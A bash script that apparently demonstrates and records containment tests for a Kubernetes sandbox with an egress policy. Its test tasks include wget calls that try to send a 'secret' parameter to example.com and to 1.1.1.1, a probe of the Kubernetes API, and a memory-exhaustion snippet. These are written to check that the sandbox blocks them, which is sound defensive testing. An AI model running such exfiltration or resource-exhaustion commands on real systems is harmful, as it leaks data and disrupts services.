#!/usr/bin/env bash
set -u
SPACE=demo-tools
REGISTRY=${REGISTRY:-localhost:5001}
OUT=${OUT:-./out}
PORT=8901
HERE=$(cd "$(dirname "$0")" && pwd)
mkdir -p "$OUT"

K() {
  local out code
  out=$(kubectl ate "$@" 2>&1)
  code=$?
  [ -n "$out" ] && printf '%s\n' "$out" | grep -v '^Warning: no --token-file'
  return "$code"
}
must() { "$@" || { echo "failed: $*" >&2; exit 1; }; }
create() {
  local out
  out=$(K create "$@") && return 0
  case "$out" in *AlreadyExists* | *"already exists"*) return 0 ;; esac
  echo "$out" >&2
  return 1
}
now() { date +%s.%N; }
since() { awk -v a="$1" -v b="$(now)" 'BEGIN { printf "%.2f", b - a }'; }
state() { kubectl ate get actor task-1 -a "$SPACE" -o json 2>/dev/null | jq -r '.status.state | sub("ACTOR_STATE_"; "")'; }

template_ready() { K get actor-templates -a "$SPACE" | awk '$2 == "sandbox" && $3 ~ /-/' | grep -q .; }

setup() {
  must docker build -q -t "$REGISTRY/tool-sandbox:v1" "$HERE" > /dev/null
  must docker push -q "$REGISTRY/tool-sandbox:v1" > /dev/null
  local image
  image=$(must docker inspect --format '{{index .RepoDigests 0}}' "$REGISTRY/tool-sandbox:v1") || exit 1
  sed "s#IMAGE#$image#" "$HERE/cluster.yaml" | must kubectl apply -f - > /dev/null
  must kubectl -n "$SPACE" rollout status deploy/pkg-mirror --timeout=180s > /dev/null
  must kubectl -n "$SPACE" rollout status deploy/tools --timeout=180s > /dev/null
  must create atespace "$SPACE"
  sed "s#IMAGE#$image#" "$HERE/template.yaml" > /tmp/sandbox-template.yaml
  must create actor-template -f /tmp/sandbox-template.yaml
  for _ in $(seq 1 60); do
    template_ready && break
    sleep 2
  done
  must template_ready
  must create actor task-1 -a "$SPACE" --template sandbox
  must create egress-policy task-1 -a "$SPACE" -f "$HERE/egress-policy.yaml"
}

task() {
  local label=$1 command=$2 start result
  result=$(python3 "$HERE/client.py" "$PORT" "$command")
  printf '%s\ttask\t%s\t%s\n' "$label" "$(state)" "$result" >> "$OUT/tasks.tsv"
  start=$(now)
  K revert actor task-1 -a "$SPACE" > /dev/null
  printf '%s\trevert\t%s\t-\t%s\t-\n' "$label" "$(state)" "$(since "$start")" >> "$OUT/tasks.tsv"
  result=$(python3 "$HERE/client.py" "$PORT" "ls -A /work | wc -l")
  printf '%s\tclean-check\t%s\t%s\n' "$label" "$(state)" "$result" >> "$OUT/tasks.tsv"
}

record() {
  kubectl ate proxy actor task-1 -a "$SPACE" "$PORT:80" > /tmp/sandbox-proxy.log 2>&1 &
  for _ in $(seq 1 40); do grep -q Proxying /tmp/sandbox-proxy.log 2>/dev/null && break; sleep 0.3; done
  printf 'label\tphase\tstate\thttp\tseconds\tresult\n' > "$OUT/tasks.tsv"
  task "allowed download" "wget -q -O hello.txt http://pkg-mirror.demo-tools.svc.cluster.local/hello-1.0.txt && cat hello.txt && ls"
  task "send data out by name" "nslookup example.com 2>&1 | tail -2; wget -T 5 -q -O- 'http://example.com/?secret=1'; echo wget_exit=\$?"
  task "send data out by IP" "wget -T 5 -q -O- 'http://1.1.1.1/?secret=1'; echo wget_exit=\$?"
  task "reach the Kubernetes API" "wget -T 5 -q -O- http://kubernetes.default.svc.cluster.local/; echo wget_exit=\$?"
  task "2 s of CPU work on a 500m limit" "python3 -c 'import time; w=time.time(); c=time.process_time(); x=0
while time.process_time()-c < 2: x += 1
print(\"wall_seconds\", round(time.time()-w, 2))'"
  task "memory hog on a 256 MiB limit" "python3 -c 'import os; b=[os.urandom(32<<20) for _ in range(20)]; print(len(b))'"
  K get egress-policy task-1 -a "$SPACE" -o yaml > "$OUT/egress-policy-live.yaml"
  K get actor task-1 -a "$SPACE" -o yaml > "$OUT/actor.yaml"
  K logs actor task-1 -a "$SPACE" --source=lifecycle > "$OUT/lifecycle.log" 2>&1
  K suspend actor task-1 -a "$SPACE" > /dev/null
  pkill -f "proxy actor task-1 " 2>/dev/null
}

case "${1:-}" in
  setup) setup ;;
  record) record ;;
  *) echo "usage: $0 setup | record" ;;
esac
